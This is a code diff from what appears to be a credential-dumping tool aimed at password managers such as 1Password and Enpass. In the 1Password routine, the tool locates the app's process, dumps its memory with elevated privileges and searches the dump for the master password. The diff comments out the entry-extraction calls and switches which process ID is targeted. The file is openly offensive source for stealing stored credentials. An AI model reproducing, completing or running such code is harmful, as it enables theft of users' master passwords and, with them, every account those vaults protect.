@@ -18,7 +18,7 @@
 #include "../1password/app/getCreds1passwordappEntries1.h"
 #include "../1password/app/getCreds1passwordappEntries2.h"
 #include "../1password/app/getProcUAC1password.h"
-#include "../1password/app/FindsecondPID1password.h"
+#include "../1password/app/FindthirdPID1password.h"
 #include "../1password/plugin/getCreds1passwordplugin.h"
 #include "../1password/plugin/getCreds1passwordplugin2.h"
 #include "../enpass/getCredsenpassEntries.h"
@@ -512,16 +512,16 @@ int checkApps() {
         if (userInput2 == "1") {
             std::cout << "User input matches '1password' app.\n";
             std::cout << "Fast and Full are the same for this app.\n";
-            std::cout << "1Password contains all relevant credentials (master pass, username, entries, etc.).\n";
+            //std::cout << "1Password contains all relevant credentials (master pass, username, entries, etc.).\n";
             std::cout << "'1Password' needs High Integrity Privileges to dump the relevant process!\n";
 
             if (mode == "local") {
-                std::cout << "Searching for entries (1/2).\n";
-                getCreds1passwordappEntries1(fileInput);
-                std::cout << "Done!\n";
-                std::cout << "Searching for entries (2/2).\n";
-                getCreds1passwordappEntries2(fileInput);
-                std::cout << "Done!\n";
+                //std::cout << "Searching for entries (1/2).\n";
+                //getCreds1passwordappEntries1(fileInput);
+                //std::cout << "Done!\n";
+                //std::cout << "Searching for entries (2/2).\n";
+                //getCreds1passwordappEntries2(fileInput);
+                //std::cout << "Done!\n";
                 std::cout << "Searching for master credentials.\n";
                 getCreds1passwordappMaster(fileInput);
                 std::cout << "Done!\n";
@@ -531,18 +531,18 @@ int checkApps() {
                 std::cout << "Assume that we have high integrity privileges.\n";
                 fileInput = "app.dmp";
                 // Step 1: Find PIDs of 1Password
-                string pid = FindsecondPID1password();
+                string pid = FindthirdPID1password();
                 if (pid != "")
                 {
                     // Step 2: Create a dump file for the process with the second-largest size (Powershell assist)
                     // File creation is a bit messy, but the process was not being dumped with another way
                     getProcUAC1password(pid);
-                    std::cout << "Searching for entries (1/2).\n";
-                    getCreds1passwordappEntries1(fileInput);
-                    std::cout << "Done!\n";
-                    std::cout << "Searching for entries (2/2).\n";
-                    getCreds1passwordappEntries2(fileInput);
-                    std::cout << "Done!\n";
+                    //std::cout << "Searching for entries (1/2).\n";
+                    //getCreds1passwordappEntries1(fileInput);
+                    //std::cout << "Done!\n";
+                    //std::cout << "Searching for entries (2/2).\n";
+                    //getCreds1passwordappEntries2(fileInput);
+                    //std::cout << "Done!\n";
                     std::cout << "Searching for master pass.\n";
                     getCreds1passwordappMaster(fileInput);
                     std::cout << "Done!\n";
